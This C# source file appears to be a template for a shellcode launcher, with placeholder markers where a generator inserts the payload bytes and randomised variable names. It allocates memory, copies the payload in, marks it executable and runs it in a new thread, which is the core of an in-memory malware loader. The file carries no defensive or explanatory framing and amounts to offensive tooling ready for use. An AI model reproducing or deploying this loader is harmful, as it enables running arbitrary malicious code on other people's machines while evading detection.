// https://gist.github.com/0xhexmex/f1a0e47a3f8ff4246d792091eccd0af9
using System;
using System.Runtime.InteropServices;

namespace ShellCodeLauncher
{
    class Program
{
    static void Main(string[] args)
    {
        byte[] %%VAR1%% = new byte[%%LENGTH%%] {%%DATA%%};
        UInt32 %%VAR3%% = VirtualAlloc(0, (UInt32) %%VAR1%%.Length,
							MEM_COMMIT, PAGE_READWRITE);
							
        Marshal.Copy(%%VAR1%%, 0, (IntPtr)(%%VAR3%%), %%VAR1%%.Length);
		uint oldprotection;
		
		VirtualProtect((IntPtr)(%%VAR3%%), %%VAR1%%.Length, PAGE_EXECUTE, out oldprotection);
        IntPtr hThread = IntPtr.Zero;
        UInt32 threadId = 0;
		// prepare data
		
		
        IntPtr pinfo = IntPtr.Zero;
        
		
		// execute native code
		
		hThread = CreateThread(0, 0, %%VAR3%%, pinfo, 0, ref threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
		return;
    }

    private static UInt32 MEM_COMMIT = 0x1000;

    private static UInt32 PAGE_READWRITE = 0x04;
	
	private static UInt32 PAGE_EXECUTE = 0x10;

		[DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);


        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId

          );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
          );
}
}
